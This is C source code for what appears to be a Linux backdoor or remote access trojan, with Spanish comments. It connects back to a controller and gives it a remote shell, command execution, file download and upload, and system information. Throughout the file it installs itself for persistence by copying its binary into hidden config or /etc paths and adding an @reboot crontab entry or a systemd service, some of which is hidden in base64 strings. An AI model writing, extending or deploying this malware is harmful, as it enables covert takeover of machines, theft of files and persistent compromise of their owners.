#include <netinet/in.h>  
#include <stdio.h> 
#include <stdlib.h> 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <locale.h>
#include <stdbool.h>
#include <libgen.h>
#include <signal.h>
#include <sys/stat.h>
#include "../src/base64.c"
#include "../src/sysInfoLin.c"


// Definiciones
#define SOCKBUFF 2048
#define CMDBUFF 4096

// Variables Globales 

// Prototipos
char *IsElevated();
int mainLoop(int conn);
int excndSend(int conn, char* cmd);
int readNdSndFle(int conn, char *file);
void conection();
void ash(int conn);
void _chdir(int conn, char *instruct);
char* copySource(int conn, char *method);

char *IsElevated(){ 
    if (getuid()) {
        return "no";
    } else {
        return "yes";
    }
    return 0;

}

int excndSend(int conn, char* cmd){
    if (strstr(cmd, "exec") != NULL){
        char toReplace[] = "exec ";

        char *substr = strstr(cmd, toReplace);
        size_t remainingLength = strlen(substr + strlen(toReplace));
        memmove(cmd, substr + strlen(toReplace), remainingLength + 1);

        if (strstr(cmd, "cd") != NULL){
            _chdir(conn, cmd);
            return 0;
        } 
    }
    
    FILE *xx = NULL;
    char* path = NULL;
    size_t path_size = 0;
    
    char fullCmd[CMDBUFF] = "";
    snprintf(fullCmd, sizeof(fullCmd), "%s 2>&1", cmd);
    
    xx = popen(fullCmd, "r");
    if (xx == NULL){
        char error[100] = "Error executing command...";
        send(conn, error, sizeof(error), 0);
        return 1;
    }

    while (getline(&path, &path_size, xx) != -1){
        send(conn, path, strlen(path), 0);
    }

    free(path);
    sleep(0.5); 
    send(conn, "end\0", strlen("end\0"), 0); 
    pclose(xx);
    return 0;
    
} 

void _chdir(int conn, char *instruct) {
    char *directory = malloc(SOCKBUFF + 1);
    char *newDir = malloc(SOCKBUFF + 1);
    memset(directory, 0, SOCKBUFF + 1);
    memset(newDir, 0, SOCKBUFF + 1);

    if (strcmp(instruct, "cd") == 0) {
        getcwd(directory, SOCKBUFF);
        send(conn, directory, strlen(directory), 0);
        sleep(0.3); 
        send(conn, "end\0", strlen("end\0"), 0);
        return;
    }

    char toReplace[] = "cd ";

    char *substr = strstr(instruct, toReplace); 
    memmove(directory, substr + strlen(toReplace), strlen(substr + strlen(toReplace)) + 1);
    
    chdir(directory);
    getcwd(newDir, SOCKBUFF); 
    send(conn, newDir, SOCKBUFF, 0);
    
    sleep(0.3);  
    send(conn, "end\0", strlen("end\0"), 0);
    
    free(directory);
    free(newDir);
}


void ash(int conn){
    char cmd[CMDBUFF] = "";

    while (true){
        recv(conn, cmd, sizeof(cmd), 0); 
        if (strcmp(cmd, "q") == 0){
            memset(cmd, 0, SOCKBUFF);
            break;
        } else if (strlen(cmd) == 0)
        {
            continue;
        } else if(strstr(cmd, "cd") != NULL){
            _chdir(conn, cmd);
            memset(cmd, 0, SOCKBUFF);
        } else {
            excndSend(conn, cmd);
            // Limpiar comando recibido
            memset(cmd, 0, SOCKBUFF);
        }
    }
    sleep(0.5); 
    return;
}

void strtSnd(int conn, char *instruct){
    char *file = malloc(strlen(instruct) + 1); // Asigna memoria a 'file'
    char toReplace[] = "download ";

    char *substr = strstr(instruct, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), remainingLength + 1);
    readNdSndFle(conn, file);


}

int writeAndDecodeData(char *data, char *file){  
    char *base = basename(file);   
 
    FILE *fp;
    char* DecodedData = base64_decode(data);  
    fp = fopen(base, "w");
    
    if (fp == NULL){ 
        return 1;
    }

    fprintf(fp ,"%s" ,DecodedData);
    fclose(fp);

    return 0;   
}

int uploadFunc(char *command, int conn){
    //Variables necesarias 
    char *file = malloc(strlen(command) + 1); // Asigna memoria a 'file'
    memset(file, 0, strlen(command) + 1);
    char toReplace[] = "upload ";
    
    char *substr = strstr(command, toReplace);   
    size_t subLen = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), subLen);
    file[subLen] = '\0'; // Asegúrate de terminar la cadena con el carácter nulo.

    
    // Lógica para descargar archivos
    char recvData[SOCKBUFF];  // Utilizamos un búfer para recibir datos
    char *downloadedData = NULL;
    size_t downloadedSize = 0;

    // Inicializamos el búfer con valores nulos para evitar problemas con strcat
    memset(recvData, 0, sizeof(recvData));

    while (true) {
        int bytesRead = recv(conn, recvData, SOCKBUFF, 0);
         
        if (bytesRead <= 0) {
            // Manejo de error de recepción
            send(conn, "Error en la recepción de datos.\n", strlen("Error en la recepción de datos.\n"), 0);
            free(downloadedData);
            free(file);
            return 1;
        }

        if (strstr(recvData, "end\0") != NULL) {  
            // Recibido el indicador de final "end\0"
            break;
        } else { 
            // Añadir los datos recibidos al búfer de descarga
            char *temp = realloc(downloadedData, downloadedSize + bytesRead);
            if (temp == NULL) {
                // Error de memoria
                free(downloadedData);
                free(file);
                return 1;
            }
            downloadedData = temp;
            memcpy(downloadedData + downloadedSize, recvData, bytesRead);
            downloadedSize += bytesRead; 
        }
    }
 
    writeAndDecodeData(downloadedData, file);
    sleep(0.3);
    send(conn, "end\0", strlen("end\0"), 0);

    free(downloadedData);
    free(file);
    return 0;
} 

int readNdSndFle(int conn, char *file){
    setlocale(LC_ALL, "en_US.UTF-8");   

    FILE *ptr;
    // Abrimos el archivo en modo de lectura
    ptr = fopen(file, "rb");

    if (ptr == NULL) {
        send(conn, "No se puede abrir el archivo.\n", strlen("No se puede abrir el archivo.\n"), 0);
        sleep(0.3);
        send(conn, "end\0", strlen("end\0"), 0);
        return 1;
    }

    char buffer[SOCKBUFF];   

    // Inicializamos los búferes con valores nulos
    memset(buffer, 0, sizeof(buffer));

    // Lee el archivo en búferes y codifícalo en Base64 antes de enviarlo
    size_t bytesRead;

    while ((bytesRead = fread(buffer, 1, SOCKBUFF, ptr)) > 0) {
        char *base64Encoded = base64_encode(buffer, strlen(buffer));

        send(conn, base64Encoded, strlen(base64Encoded), 0);
        //printf("%s", base64Encoded);
        free(base64Encoded);  // Liberar la memoria asignada por base64_encode
    }


    // Cierra el archivo
    fclose(ptr);
    sleep(0.3);
    send(conn, "end\0", strlen("end\0"), 0); 
    //printf("end");
    return 0;
}

char* copySource(int conn, char *method){
    char* home = getenv("HOME");
    char* configPath = malloc(SOCKBUFF);
    char* servicePath = "/.config/Worker";
    char* lction = malloc(strlen(home) + strlen(servicePath) + 1);

    strcpy(lction, home);
    strcpy(configPath, home);
    strcat(lction, servicePath);
    strcat(configPath, "/.config");

    char path[SOCKBUFF];
    memset(path, 0, SOCKBUFF);

    ssize_t count = readlink("/proc/self/exe", path, SOCKBUFF);
    if (count == -1) {
        send(conn, "error", strlen("error"), 0);
        free(lction);  // Liberar la memoria asignada
        return NULL;
    }

    char command[SOCKBUFF];
    if (strcmp(method, "low") == 0){
        struct stat buffer;
        if (stat(configPath, &buffer) != 0) {
            mkdir(configPath, 0755); 
        }
        printf("\n\n");
        struct stat buffer1;
        if (stat(lction, &buffer1) != 0) {
            mkdir(lction, 0755); 
        }

        strcat(lction, "/worker");
        sprintf(command, "cp %s %s && chmod 755 %s", path, lction, lction);
    }
    
    else if (strcmp(method, "high") == 0){
        struct stat buffer3;
        if (stat("/etc/addOn/", &buffer3) != 0) {
            mkdir("/etc/addOn/", 0700); 
        }
        sprintf(command, "cp %s /etc/addOn/addOnBinary && chmod 755 /etc/addOn/addOnBinary", path);

    }
    
    system(command);
    
    if (strcmp(method, "high") == 0)
        return "/etc/addOn/addOnBinary";
    else 
        return lction;
}

int getPrstnc(int conn, char *method) {

    if (strcmp(method, "low") == 0) {
        char* path = copySource(conn, method);
        //printf("%s", path);
        if (path == NULL) {
            return 1;
        }

        char* cmd = malloc(SOCKBUFF);
        char* kwor = malloc(SOCKBUFF);

        snprintf(kwor, SOCKBUFF, "@reboot %s\n", path);
        snprintf(cmd, SOCKBUFF, "echo '%s' > /tmp/tmpajfeasc && crontab /tmp/tmpajfeasc && rm /tmp/tmpajfeasc", kwor);

        system(cmd);

        //printf("\n\n%s", cmd);

        send(conn, "exito", strlen("exito"), 0);

        free(cmd);
        free(kwor);
        free(path);

    } else if (strcmp(method, "high") == 0) {

        if (strcmp(IsElevated(), "yes") == 0){
            char* path = copySource(conn, "high");  // Llama a copySource con el método "high"

            if (path == NULL) {
                send(conn, "error", strlen("error"), 0);
                return 1;
            }
            FILE *fp = fopen("/etc/systemd/system/addOn-xsession.service", "w");
            if (fp == NULL){
                send(conn, "error", strlen("error"), 0);
                return 1;
            }
            fprintf(fp, "%s", base64_decode("CltVbml0XQpEZXNjcmlwdGlvbj1YLVNlc3Npb24tYWRkT24KQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpFeGVjU3RhcnQ9L2V0Yy9hZGRPbi9hZGRPbkJpbmFyeQpSZXN0YXJ0PWFsd2F5cwoKW0luc3RhbGxdCldhbnRlZEJ5PWdyYXBoaWNhbC50YXJnZXQgCg=="));
            fclose(fp);

            system(base64_decode("c3lzdGVtY3RsIGVuYWJsZSBhZGRPbi14c2Vzc2lvbi5zZXJ2aWNlICY+L2Rldi9udWxsCg=="));

            // Envía una respuesta al cliente
            send(conn, "exito", strlen("exito"), 0);
        }
        else {
            send(conn, "permissonError", strlen("permissonError"), 0);
            return 1;
        }
    }
    return 0;
}

int mainLoop(int conn){
    char instruct[SOCKBUFF];
    while (true){
        memset(instruct, 0, SOCKBUFF);
        recv(conn, instruct, sizeof(instruct), 0); 
        if (strcmp(instruct, "exit") == 0){
            close(conn); 
            return 0;
        }
        else if (strcmp(instruct, "exit -y") == 0){
            close(conn);
            exit(0);
        }
        else if (strcmp(instruct, "shell") == 0)    
            ash(conn); 
        
        else if (strstr(instruct, "download ") != NULL)
            strtSnd(conn, instruct);
        
        else if (strstr(instruct, "exec") != NULL){
            excndSend(conn, instruct);

        }
        else if (strstr(instruct, "upload") != NULL)
            uploadFunc(instruct, conn);
        
        else if (strcmp(instruct, "sysinfo") == 0){
            srtSysInfo(conn);
            send(conn, "end\0", strlen("end\0"), 0);
        
        } else if (strcmp(instruct, "lowpersistence") == 0){
            getPrstnc(conn, "low");          
            sleep(0.3);
        
        } else if (strcmp(instruct, "persistence") == 0){
            getPrstnc(conn, "high");          
            sleep(0.3);

        } else if(strcmp(instruct, "check") == 0){
            send(conn, IsElevated(), strlen(IsElevated()), 0);

        }else
            continue;
    }
    return 0;
}

void conection(){
    // Geberabanis el socket
    int conn = socket(AF_INET, SOCK_STREAM, 0);

    // Generamos estructura de datos 
    struct sockaddr_in cltAddr;
    
    cltAddr.sin_family = AF_INET;
    cltAddr.sin_port = htons(9001); // Especifcamos puerto 
    cltAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    int targetConnStatus 
        = connect(conn, (struct sockaddr*)&cltAddr, 
                    sizeof(cltAddr));

    if (targetConnStatus == -1) {
        sleep(10);
        conection();
        //printf("%s[!>] %sERROR...\n", YELLOW, RED);

    } else {
        mainLoop(conn);
        sleep(10);
        conection();
    }
}

int main(int argc, char const* argv[]){
    conection();
    return 0;

}
